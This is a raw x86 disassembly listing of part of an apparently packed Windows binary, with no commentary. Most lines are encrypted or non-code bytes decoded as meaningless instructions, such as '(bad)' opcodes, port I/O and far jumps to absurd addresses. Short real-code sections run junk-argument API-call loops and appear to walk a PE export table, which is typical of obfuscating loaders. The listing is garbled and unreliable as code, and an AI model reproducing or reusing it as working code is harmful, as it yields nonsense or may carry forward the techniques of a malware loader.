  413ff9:	shl    BYTE PTR [ecx],0xd9
  413ffc:	adc    BYTE PTR [edx-0xb],bl
  413fff:	pop    es
  414000:	dec    ecx
  414001:	(bad)  
  414002:	cli    
  414003:	jl     0x413fdb
  414005:	pop    eax
  414006:	mov    esp,0x78adf992
  41400b:	repz sub dh,BYTE PTR [eax+0x79]
  41400f:	nop
  414010:	sbb    dl,BYTE PTR [ecx+eax*1+0x8]
  414014:	xor    al,0x2d
  414016:	loop   0x413fc1
  414018:	ds hlt 
  41401a:	adc    edx,eax
  41401c:	out    0x88,eax
  41401e:	xchg   esp,eax
  41401f:	and    al,BYTE PTR [ebp+0x40]
  414022:	jle    0x413ff1
  414024:	jo     0x413fd1
  414026:	jge    0x414037
  414028:	push   0xffffffc0
  41402a:	lods   eax,DWORD PTR ds:[esi]
  41402b:	ins    DWORD PTR es:[edi],dx
  41402c:	ins    BYTE PTR es:[edi],dx
  41402d:	xor    dh,al
  41402f:	test   WORD PTR [esi+edi*8+0x91028],di
  414037:	cld    
  414038:	das    
  414039:	in     eax,dx
  41403a:	xchg   ecx,eax
  41403b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41403c:	les    esp,FWORD PTR [edx+0x3b]
  41403f:	ret    0xa665
  414042:	pop    ss
  414043:	retf   0x91d9
  414046:	mov    ebx,0x3061ff2f
  41404b:	das    
  41404c:	je     0x413fe3
  41404e:	jae    0x414066
  414050:	fistp  QWORD PTR [esi-0xd]
  414053:	push   esp
  414054:	inc    edx
  414055:	mov    ecx,DWORD PTR ds:0xfbd9e74
  41405b:	cdq    
  41405c:	ss in  eax,0xfa
  41405f:	mov    bh,0xde
  414061:	rcl    ah,1
  414063:	dec    esi
  414064:	or     al,0x7e
  414066:	dec    eax
  414067:	jge    0x4140ca
  414069:	xor    edx,ebx
  41406b:	pmulhuw mm7,QWORD PTR [edi-0x17d65fb4]
  414072:	mov    ebx,0x63c0974f
  414077:	les    esp,FWORD PTR [eax+ecx*4+0x729940d3]
  41407e:	ss pop ecx
  414080:	loope  0x41409a
  414082:	test   eax,0x167a4247
  414087:	mov    dh,0xe4
  414089:	xchg   esi,eax
  41408a:	xchg   BYTE PTR [ecx-0x409a992e],ch
  414090:	arpl   WORD PTR [esi-0x62],cx
  414093:	outs   dx,DWORD PTR ds:[esi]
  414094:	pop    edx
  414095:	mov    al,ds:0x4112f77c
  41409a:	lsl    ebx,cx
  41409d:	ret    0x32bf
  4140a0:	imul   ecx,DWORD PTR [eax+eax*4+0x33],0xfffffff0
  4140a5:	fsubr  st,st(5)
  4140a7:	mov    BYTE PTR [eax],0xfb
  4140aa:	cmp    esp,ebx
  4140ac:	mov    esp,cs
  4140ae:	mov    edx,0x13755d64
  4140b3:	xor    DWORD PTR [ecx+0x38],eax
  4140b6:	push   esi
  4140b7:	out    dx,al
  4140b8:	das    
  4140b9:	stc    
  4140ba:	outs   dx,DWORD PTR ds:[esi]
  4140bb:	sahf   
  4140bc:	shl    BYTE PTR [edx-0x1c],0x9a
  4140c0:	pop    es
  4140c1:	jge    0x41412e
  4140c3:	imul   DWORD PTR [esi+0xd93af9]
  4140c9:	shl    esp,1
  4140cb:	ret    0xc1f5
  4140ce:	call   0x676d043a
  4140d3:	lods   eax,DWORD PTR ds:[esi]
  4140d4:	mov    edi,0xbe4ab326
  4140d9:	jle    0x41406a
  4140db:	repz pop esp
  4140dd:	mov    edx,0x6f043bc
  4140e2:	call   0xd450513c
  4140e7:	out    0x88,eax
  4140e9:	xor    BYTE PTR [eax+ecx*1+0x54e22750],bl
  4140f0:	loope  0x41416d
  4140f2:	mov    edx,eax
  4140f4:	mov    edi,0x9e2b2ac
  4140f9:	inc    esp
  4140fa:	pop    edi
  4140fb:	icebp  
  4140fc:	push   0xc1951fb1
  414101:	jae    0x4140bd
  414103:	addr16 jnp 0x4140f4
  414106:	sub    edi,esp
  414108:	repz rol ecx,1
  41410b:	jne    0x4140db
  41410d:	mov    bh,0xed
  41410f:	scas   eax,DWORD PTR es:[edi]
  414110:	test   eax,0xc352e3fb
  414115:	inc    eax
  414116:	fld    QWORD PTR [edx+ebp*2]
  414119:	xor    al,0xa8
  41411b:	pop    ecx
  41411c:	icebp  
  41411d:	jae    0x414160
  41411f:	(bad)  
  414120:	pop    ss
  414121:	ror    BYTE PTR [edx],0xbe
  414124:	xchg   esp,eax
  414125:	call   0xb432:0x357f59f6
  41412c:	mov    edx,0xb106113
  414131:	dec    ebp
  414132:	(bad)  
  414133:	icebp  
  414134:	ja     0x41417e
  414136:	arpl   WORD PTR [ebx+0x6f],bx
  414139:	inc    ebp
  41413a:	mul    DWORD PTR [esi]
  41413c:	cmp    ah,0x6d
  41413f:	inc    ecx
  414140:	sti    
  414141:	rcr    esi,cl
  414143:	rol    BYTE PTR es:[esi],cl
  414146:	pop    esi
  414147:	pop    edi
  414148:	xchg   esp,eax
  414149:	add    ecx,DWORD PTR [ecx+0x60]
  41414c:	ds jmp 0x4c6c7a48
  414152:	jg     0x414180
  414154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414155:	out    0x1a,al
  414157:	mov    ah,0x44
  414159:	loope  0x414155
  41415b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41415c:	out    dx,eax
  41415d:	push   edi
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x41420e
  414283:	out    0xb8,eax
  414285:	cmp    BYTE PTR [eax-0x468f8f8d],al
  41428b:	jle    0x4142fd
  41428d:	jo     0x414249
  41428f:	pop    eax
  414290:	cmp    DWORD PTR [edx],0xe9cb9fc2
  414296:	inc    ecx
  414297:	(bad)  [edi]
  414299:	call   0x29b2baed
  41429e:	popf   
  41429f:	loopne 0x414280
  4142a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142a2:	lds    ebp,FWORD PTR [edx-0x31]
  4142a5:	test   eax,0x2be3efd2
  4142aa:	les    ecx,FWORD PTR [edx]
  4142ac:	mov    al,0xa8
  4142ae:	inc    ebp
  4142af:	cmp    esi,esi
  4142b1:	jne    0x4142fd
  4142b3:	xchg   edx,eax
  4142b4:	or     esp,edx
  4142b6:	sbb    dl,BYTE PTR [ecx-0x57]
  4142b9:	push   edi
  4142ba:	sbb    bh,cl
  4142bc:	inc    ebx
  4142bd:	into   
  4142be:	mov    cl,0x30
  4142c0:	mov    bh,0x9b
  4142c2:	das    
  4142c3:	inc    ecx
  4142c4:	push   0xf24112b9
  4142c9:	mov    ah,0xb4
  4142cb:	adc    ch,BYTE PTR [ebx-0x6c]
  4142ce:	fwait
  4142cf:	push   eax
  4142d0:	sahf   
  4142d1:	in     eax,0x5d
  4142d3:	mov    dh,0x3a
  4142d5:	mov    ch,0xc3
  4142d7:	inc    ebx
  4142d8:	(bad)  
  4142d9:	push   ebx
  4142da:	mov    ebx,DWORD PTR [esp+edx*1+0x73]
  4142de:	test   al,0x4e
  4142e0:	scas   al,BYTE PTR es:[edi]
  4142e1:	fs aas 
  4142e3:	ret    0xe74c
  4142e6:	jmp    0x41435a
  4142e8:	pusha  
  4142e9:	add    al,BYTE PTR [edi+0x32]
  4142ec:	fbld   TBYTE PTR [edx]
  4142ee:	jbe    0x414368
  4142f0:	icebp  
  4142f1:	and    DWORD PTR [ecx],0x5de812a1
  4142f7:	mov    cl,0xe8
  4142f9:	mov    ch,0x54
  4142fb:	pop    ecx
  4142fc:	lahf   
  4142fd:	dec    edx
  4142fe:	and    eax,0x52226a57
  414303:	mov    ch,0xc
  414305:	enter  0x8936,0x1d
  414309:	dec    cx
  41430b:	mov    ebp,DWORD PTR [ebx]
  41430d:	dec    edi
  41430e:	xchg   esp,eax
  41430f:	sub    bh,BYTE PTR [eax+0x17bf5334]
  414315:	jbe    0x4142f1
  414317:	adc    bh,0x0
  41431a:	aas    
  41431b:	in     al,0x1
  41431d:	dec    esp
  41431e:	lea    edi,[ecx-0x20]
  414321:	xor    eax,0xc14ad7f5
  414326:	std    
  414327:	pop    ecx
  414328:	mov    esp,0x420036e0
  41432d:	jae    0x4142e8
  41432f:	push   ds
  414330:	add    esi,esp
  414332:	mov    ecx,0x806ba351
  414337:	repz pop ss
  414339:	inc    ebp
  41433a:	pop    edx
  41433b:	jmp    0x8057e5a9
  414340:	mov    ebp,0xfd61c16f
  414345:	clc    
  414346:	test   ebp,esi
  414348:	mov    edx,0x5462861a
  41434d:	addr16 mov al,ds:0xa203
  414351:	in     eax,0xbb
  414353:	in     al,dx
  414354:	pop    edi
  414355:	add    dl,BYTE PTR [edi]
  414357:	add    eax,0x8f6a5569
  41435c:	xor    dl,BYTE PTR [eax]
  41435e:	lock scas al,BYTE PTR es:[edi]
  414360:	mov    al,ds:0x84edf531
  414365:	sub    BYTE PTR [ecx+0x6e50daf],cl
  41436b:	test   dl,al
  41436d:	mov    dl,0x28
  41436f:	sub    esp,DWORD PTR gs:[esp+ebx*8+0x55d7b58f]
  414377:	pop    ss
  414378:	sub    al,0x7d
  41437a:	mov    BYTE PTR [eax+0x25],ch
  41437d:	pop    edx
  41437e:	bound  ebx,QWORD PTR [ebx+ecx*1+0x11]
  414382:	fsubr  st,st(1)
  414384:	push   0x600d3753
  414389:	mov    ds:0x3b876cf9,eax
  41438e:	call   0xaa19:0xca722913
  414395:	inc    edi
  414396:	(bad)  
  414398:	(bad)  
  414399:	loopne 0x4143f5
  41439b:	pop    ecx
  41439c:	jmp    0xb35:0x8f27e5de
  4143a3:	fld    TBYTE PTR [ecx]
  4143a5:	les    edi,FWORD PTR [ecx-0xdeee85]
  4143ab:	pop    esi
  4143ac:	pop    ds
  4143ad:	scas   eax,DWORD PTR es:[edi]
  4143ae:	stos   BYTE PTR es:[edi],al
  4143af:	push   ds
  4143b0:	hlt    
  4143b1:	adc    al,0x61
  4143b3:	fisttp WORD PTR [edx+0x65252f38]
  4143b9:	in     al,dx
  4143ba:	je     0x414389
  4143bc:	ds aas 
  4143be:	repnz xor DWORD PTR [edx+0x4bfaedcd],esi
  4143c5:	shl    BYTE PTR [ecx-0x69247bb9],0xd9
  4143cc:	out    0x5f,al
  4143ce:	das    
  4143cf:	bound  ebx,QWORD PTR [edi+0x60]
  4143d2:	inc    ecx
  4143d3:	bnd repz jb 0x4143d0
  4143d7:	repz hlt 
  4143d9:	lods   eax,DWORD PTR ds:[esi]
  4143da:	xchg   ebx,eax
  4143db:	in     eax,0xfe
  4143dd:	pop    edi
  4143de:	push   ss
  4143df:	jb     0x414389
  4143e1:	lods   eax,DWORD PTR ds:[esi]
  4143e2:	xor    al,0x48
  4143e4:	sar    BYTE PTR [ebp+0x3c2e813],1
  4143ea:	push   eax
  4143eb:	lods   al,BYTE PTR ds:[esi]
  4143ec:	into   
  4143ed:	mov    esi,0x7af02c46
  4143f2:	or     cl,0xdd
  4143f5:	mov    edx,0xa6e1b42c
  4143fa:	aam    0x18
  4143fc:	cld    
  4143fd:	aaa    
  4143fe:	and    al,BYTE PTR [eax]
  414400:	pop    ebp
  414401:	cs push ecx
  414403:	push   es
  414404:	imul   edi,DWORD PTR [ebx],0x9347779e
  41440a:	add    eax,0x155c7818
  41440f:	outs   dx,DWORD PTR ds:[esi]
  414410:	dec    ebp
  414411:	cmp    al,0x6
  414413:	push   ebx
  414414:	dec    ebp
  414415:	sub    al,0xb8
  414417:	adc    edi,DWORD PTR [ecx]
  414419:	ja     0x414469
  41441b:	mov    eax,0x1f62cf20
  414420:	mov    WORD PTR [ebx],cs
  414422:	xchg   ebx,eax
  414423:	popf   
  414424:	loopne 0x414491
  414426:	push   ebx
  414427:	fdiv   DWORD PTR [ebx]
  414429:	jnp    0x414431
  41442b:	mov    esp,0x7bd492ff
  414430:	scas   eax,DWORD PTR es:[edi]
  414431:	jmp    0x303a0784
  414436:	inc    ebp
  414437:	(bad)  
  414438:	dec    ebp
  414439:	jb     0x4144b5
  41443b:	jmp    0x456664e8
  414440:	push   ss
  414441:	xor    dl,al
  414443:	dec    DWORD PTR [ecx]
  414445:	(bad)  
  414446:	mov    esi,0x32086f50
  41444b:	cmc    
  41444c:	cwde   
  41444d:	test   DWORD PTR [edx+0x40],ecx
  414450:	inc    eax
  414451:	mov    dl,0x10
  414453:	int    0x11
  414455:	mov    ah,0xb3
  414457:	mov    BYTE PTR [ebx],al
  414459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41445a:	push   ebx
  41445b:	mov    bh,0xae
  41445d:	in     eax,dx
  41445e:	sbb    BYTE PTR [eax+0x56],bl
  414461:	js     0x4144ca
  414463:	sub    BYTE PTR [edx],al
  414465:	int3   
  414466:	arpl   WORD PTR [edx],dx
  414468:	sbb    al,0xa4
  41446a:	mov    edi,ecx
  41446c:	sbb    ebp,ebx
  41446e:	xchg   esi,eax
  41446f:	jge    0x4143fa
  414471:	(bad)  
  414472:	out    0x13,al
  414474:	ret    0x173e
  414477:	jo     0x414432
  414479:	fdivr  QWORD PTR [edi-0x2e]
  41447c:	loope  0x414492
  41447e:	pop    esp
  41447f:	pop    ebp
  414480:	or     bh,BYTE PTR [ebx]
  414482:	jb     0x41440d
  414484:	cmp    DWORD PTR [ebx+edi*4+0x66],eax
  414488:	scas   al,BYTE PTR es:[edi]
  414489:	and    ah,0xee
  41448c:	xor    bh,bh
  41448e:	mov    ds:0x36f1bb63,al
  414493:	mov    ebp,0xb3fc3187
  414498:	inc    eax
  414499:	add    BYTE PTR [ebx],al
  41449b:	mov    edx,0x62036837
  4144a0:	cmp    edx,DWORD PTR [edx+0x38aa08e4]
  4144a6:	push   edx
  4144a7:	repnz mov eax,0x6a91daa8
  4144ad:	xor    eax,0x25790237
  4144b2:	adc    al,al
  4144b4:	or     al,0xf5
  4144b6:	int3   
  4144b7:	adc    BYTE PTR [ecx],dl
  4144b9:	mov    WORD PTR [edx+edi*4],ds
  4144bc:	push   esi
  4144bd:	fwait
  4144be:	shl    BYTE PTR [ecx],0x46
  4144c1:	sbb    esp,0xe
  4144c4:	mov    ch,dl
  4144c6:	fs std 
  4144c8:	es ja  0x41453b
  4144cb:	outs   dx,DWORD PTR ds:[esi]
  4144cc:	add    edi,ebx
  4144ce:	adc    DWORD PTR [ebx+eax*1+0x1f6aac5c],ebp
  4144d5:	call   DWORD PTR [ecx]
  4144d7:	popa   
  4144d8:	mov    ds:0x1767d8f3,eax
  4144dd:	je     0x41448e
  4144df:	add    al,0x27
  4144e1:	pushf  
  4144e2:	cmp    BYTE PTR [eax+0x31060ee9],0x90
  4144e9:	(bad)  
  4144ea:	ja     0x414523
  4144ec:	out    dx,al
  4144ed:	cmp    al,0xee
  4144ef:	xor    BYTE PTR [edi],bh
  4144f1:	loop   0x4144a7
  4144f3:	inc    ebx
  4144f4:	dec    ecx
  4144f5:	adc    dl,BYTE PTR [eax+0x3ca8b244]
  4144fb:	fistp  QWORD PTR [ebx+0x13]
  4144fe:	sub    eax,0x2fe9f37
  414503:	xchg   ebp,eax
  414504:	sbb    DWORD PTR [eax],ecx
  414506:	fstp   DWORD PTR [edx]
  414508:	stos   BYTE PTR es:[edi],al
  414509:	test   DWORD PTR [edx+eax*2-0x8],ecx
  41450d:	outs   dx,BYTE PTR ds:[esi]
  41450e:	sbb    BYTE PTR ds:0xf770b610,bh
  414514:	pop    ss
  414515:	mov    al,ds:0xc9a4b735
  41451a:	jae    0x4144f9
  41451c:	push   ss
  41451d:	mov    ah,0x70
  41451f:	test   eax,0xb3b8555c
  414524:	imul   esi,DWORD PTR [eax+0x5c096022],0x7eab23d4
  41452e:	pop    ds
  41452f:	loope  0x414509
  414531:	inc    esp
  414532:	pusha  
  414533:	out    dx,eax
  414534:	jmp    0xe9004428
  414539:	lahf   
  41453a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41453c:	push   edx
  41453d:	in     al,dx
  41453e:	add    BYTE PTR [esi+0x5efa1ece],ch
  414544:	jmp    0x39ff:0x2d626579
  41454b:	xchg   BYTE PTR [edi],bh
  41454d:	not    ebx
  41454f:	je     0x4145a0
  414551:	ret    
  414552:	loop   0x4145c6
  414554:	aaa    
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xe431beb4
  414576:	xchg   edx,eax
  414577:	mov    ch,0xc9
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x41459f
  414581:	mov    ds:0xe4092b3f,eax
  414586:	ins    DWORD PTR es:[edi],dx
  414587:	inc    eax
  414588:	mov    ds:0x453e6955,al
  41458d:	(bad)  
  41458e:	xor    al,0x1b
  414590:	mov    dl,BYTE PTR [edx-0x78]
  414593:	arpl   WORD PTR [esi+0x545c55ef],cx
  414599:	jae    0x4145cb
  41459b:	call   0x8d41:0xbf16c648
  4145a2:	mov    ds:0x36e7e41d,al
  4145a7:	mov    ebp,0x12f2ac2
  4145ac:	iret   
  4145ad:	xor    DWORD PTR [edx],edx
  4145af:	pop    ecx
  4145b0:	push   cs
  4145b1:	pop    ss
  4145b2:	frstor gs:[esi-0x1f80ae0b]
  4145b9:	inc    edx
  4145ba:	call   0xa3c29be
  4145bf:	out    0x66,eax
  4145c1:	loopne 0x4145c3
  4145c3:	shl    bh,1
  4145c5:	xor    bh,BYTE PTR [ecx]
  4145c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c8:	or     ch,BYTE PTR [edx-0x2eb2ac89]
  4145ce:	in     al,dx
  4145cf:	mov    WORD PTR [edx],gs
  4145d1:	aam    0x7d
  4145d3:	test   eax,0x662d74cf
  4145d8:	push   ss
  4145d9:	mov    eax,0xb8ceef7a
  4145de:	mov    al,0x48
  4145e0:	fst    QWORD PTR [ebp+edi*4-0x72]
  4145e4:	jmp    0x79c49f30
  4145e9:	mov    ecx,0x342309c5
  4145ee:	xchg   edx,eax
  4145ef:	jp     0x414657
  4145f1:	fwait
  4145f2:	js     0x414610
  4145f4:	lea    esi,[eax]
  4145f6:	adc    DWORD PTR [ecx-0x6f9ed3fb],edi
  4145fc:	or     DWORD PTR [edx],esp
  4145fe:	aas    
  4145ff:	and    DWORD PTR [eax+0x19],edx
  414602:	xor    al,0x88
  414604:	sbb    dl,BYTE PTR [ebx+0x32]
  414607:	loop   0x41467a
  414609:	pop    ebp
  41460a:	js     0x4145f5
  41460c:	sti    
  41460d:	adc    BYTE PTR ds:0xfd3aadcd,dh
  414613:	jns    0x41464f
  414615:	xchg   ebp,eax
  414616:	inc    edi
  414617:	xchg   esp,eax
  414618:	or     eax,0x4515cfe0
  41461d:	sub    eax,0x4be8b4cc
  414622:	ja     0x4145f0
  414624:	imul   ecx,DWORD PTR [edx+0x6657e3e],0x7d
  41462b:	mov    ecx,0x934ac9b7
  414630:	rol    DWORD PTR [edx+0x563f8fc8],1
  414636:	sti    
  414637:	sbb    edx,DWORD PTR [edi-0x19]
  41463a:	push   cs
  41463b:	fild   QWORD PTR [edi-0x74]
  41463e:	pop    ds
  41463f:	retf   0x7493
  414642:	stos   BYTE PTR es:[edi],al
  414643:	lods   eax,DWORD PTR ds:[esi]
  414644:	cmp    BYTE PTR [ecx+0x5f1a6053],cl
  41464a:	pop    ecx
  41464b:	add    esi,DWORD PTR [ebp+0x5]
  41464e:	sub    bh,BYTE PTR [edx+0x30]
  414651:	cmp    eax,0xf3f504fb
  414656:	jb     0x4145e7
  414658:	out    0xb2,eax
  41465a:	adc    BYTE PTR [edx+0x2b],cl
  41465d:	enter  0x8b43,0x96
  414661:	xchg   ch,bh
  414663:	scas   eax,DWORD PTR es:[edi]
  414664:	jmp    0x4145f2
  414666:	gs aad 0x78
  414669:	popf   
  41466a:	mov    dh,0x44
  41466c:	in     eax,dx
  41466d:	jmp    DWORD PTR [eax+0x36]
  414670:	dec    esi
  414671:	add    cl,bl
  414673:	pop    eax
  414674:	gs ret 0x9a9a
  414678:	mov    bh,0x54
  41467a:	or     WORD PTR ds:0xbe9496b8,bp
  414681:	adc    al,0x20
  414683:	in     eax,0x92
  414685:	or     DWORD PTR [edi-0xd],0x6440273e
  41468c:	retf   
  41468d:	xor    edi,eax
  41468f:	jl     0x41467c
  414691:	dec    ecx
  414692:	and    cl,BYTE PTR [eax]
  414694:	in     eax,dx
  414695:	into   
  414696:	out    dx,al
  414697:	xchg   edi,eax
  414698:	ja     0x41461c
  41469a:	pop    edx
  41469b:	loope  0x41468a
  41469d:	push   edi
  41469e:	loopne 0x4146e1
  4146a0:	jnp    0x414641
  4146a2:	cmp    BYTE PTR [edi+0x624f233e],cl
  4146a8:	xlat   BYTE PTR ds:[ebx]
  4146a9:	das    
  4146aa:	adc    ebp,DWORD PTR [ebx-0x20d06c2a]
  4146b0:	imul   edx,edi,0x3e01d436
  4146b6:	aas    
  4146b7:	sbb    DWORD PTR [ebx-0x160efbe1],esi
  4146bd:	fwait
  4146be:	lahf   
  4146bf:	mov    bh,0xeb
  4146c1:	push   edi
  4146c2:	pop    esp
  4146c3:	cmc    
  4146c4:	retf   
  4146c5:	inc    edx
  4146c6:	push   ss
  4146c7:	adc    BYTE PTR [ebx],ah
  4146c9:	(bad)  
  4146ca:	sbb    ah,dl
  4146cc:	mov    cl,BYTE PTR [edx]
  4146ce:	jl     0x4146cf
  4146d0:	push   0xffffff92
  4146d2:	add    BYTE PTR [edi],0x76
  4146d5:	sub    cl,dh
  4146d7:	ins    BYTE PTR es:[edi],dx
  4146d8:	add    BYTE PTR [edx+0x5aa8d72b],bl
  4146de:	popa   
  4146df:	ret    
  4146e0:	xlat   BYTE PTR ds:[ebx]
  4146e1:	imul   ecx,ebx,0xf0b4f471
  4146e7:	jnp    0x4146a1
  4146e9:	dec    edi
  4146ea:	leave  
  4146eb:	pop    ecx
  4146ec:	sub    BYTE PTR ds:0x94c26fae,cl
  4146f2:	lods   al,BYTE PTR ds:[esi]
  4146f3:	(bad)  [esi+0x4ea7d938]
  4146f9:	push   0x45
  4146fb:	xchg   ebp,eax
  4146fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146fd:	jb     0x4146c4
  4146ff:	adc    BYTE PTR [eax],dh
  414701:	pop    edx
  414702:	ja     0x41468d
  414704:	test   eax,0x978d9b47
  414709:	sub    DWORD PTR [eax],edi
  41470b:	scas   al,BYTE PTR es:[edi]
  41470c:	das    
  41470d:	int3   
  41470e:	cmp    ebx,DWORD PTR [esi+0x6ffbf94]
  414714:	or     edx,DWORD PTR cs:[eax+0x6e]
  414718:	sbb    eax,0x9b706dd6
  41471d:	xchg   DWORD PTR [ecx],ecx
  41471f:	xor    BYTE PTR [edx-0x65e9a32d],bl
  414725:	sbb    cl,BYTE PTR [eax+0x78]
  414728:	repnz pop ebx
  41472a:	jb     0x414710
  41472c:	sub    BYTE PTR [ecx+0x6f39c559],bh
  414732:	add    al,cl
  414734:	or     DWORD PTR [ecx],eax
  414736:	sbb    al,0x9c
  414738:	mov    ds:0xd1c00fe,al
  41473d:	inc    esp
  41473e:	in     al,0x12
  414740:	pop    ebp
  414741:	das    
  414742:	mov    BYTE PTR [ebp+0x33],bh
  414745:	ret    0xf63
  414748:	out    0xb5,al
  41474a:	into   
  41474b:	pop    eax
  41474c:	mov    ecx,0x4628d4f6
  414751:	bound  ebp,QWORD PTR [eax-0x59a26010]
  414757:	test   al,0xad
  414759:	aam    0x32
  41475b:	cwde   
  41475c:	push   edi
  41475d:	ret    0x50e4
  414760:	mov    esp,0x7929ee65
  414765:	scas   al,BYTE PTR es:[edi]
  414766:	push   esp
  414767:	and    DWORD PTR [edx+0x6d20a6da],edi
  41476d:	test   eax,0x4dc6ab57
  414772:	ja     0x4147ed
  414774:	stc    
  414775:	push   eax
  414776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414777:	shl    dl,cl
  414779:	sbb    eax,0x89a033
  41477e:	mov    bh,BYTE PTR [esi]
  414780:	add    bh,BYTE PTR [ebp-0x3565ef73]
  414786:	(bad)  
  414787:	lods   eax,DWORD PTR ds:[esi]
  414788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414789:	popf   
  41478a:	ins    DWORD PTR es:[edi],dx
  41478b:	adc    ebx,DWORD PTR [esi+0x3e]
  41478e:	aam    0x6
  414790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414791:	push   0x6f74d343
  414796:	mov    al,0x19
  414798:	out    dx,eax
  414799:	jg     0x4147af
  41479b:	dec    ebp
  41479c:	pop    esi
  41479d:	ret    
  41479e:	fnstenv [ecx+edx*1-0x1748389e]
  4147a5:	aas    
  4147a6:	dec    edx
  4147a7:	leave  
  4147a8:	je     0x41478a
  4147aa:	mov    al,0xce
  4147ac:	out    0xc8,al
  4147ae:	dec    esp
  4147af:	daa    
  4147b0:	rcr    BYTE PTR [edx-0x141f5cc3],0x71
  4147b7:	mov    eax,ds:0x7c1c59f4
  4147bc:	jb     0x414787
  4147be:	and    al,0xe7
  4147c0:	sbb    DWORD PTR [edx],ecx
  4147c2:	mov    esi,0xc8153838
  4147c7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4147c9:	sar    BYTE PTR [edi+0x172d1718],1
  4147cf:	jo     0x4147cc
  4147d1:	and    eax,0x6729af25
  4147d6:	jp     0x414841
  4147d8:	adc    eax,0x6ff5189c
  4147dd:	mov    eax,ds:0x1146916d
  4147e2:	imul   BYTE PTR [ebx+0x24]
  4147e5:	xor    DWORD PTR [ecx+0x21],eax
  4147e8:	sbb    ebp,DWORD PTR [esi]
  4147ea:	jg     0x4147bf
  4147ec:	sbb    al,0x1
  4147ee:	rcr    ebp,0x5
  4147f1:	(bad)  
  4147f2:	fnstenv [edx+0x71]
  4147f5:	sti    
  4147f6:	jmp    0x53b7:0x7900fd2
  4147fd:	stc    
  4147fe:	add    BYTE PTR [edx],0xf0
  414801:	push   edx
  414802:	mov    dl,0xe
  414804:	xchg   esp,eax
  414805:	adc    al,bh
  414807:	sar    DWORD PTR [eax+0x7cfd5ae3],cl
  41480d:	push   ebx
  41480e:	es sar ch,1
  414811:	dec    edi
  414812:	jmp    0x28020e61
  414817:	sub    al,0xdd
  414819:	ficom  WORD PTR [edx]
  41481b:	sbb    eax,0x1ef97af1
  414820:	xor    al,0xe3
  414822:	push   es
  414823:	ins    DWORD PTR es:[edi],dx
  414824:	dec    ecx
  414825:	mov    ebp,ecx
  414827:	xchg   esp,eax
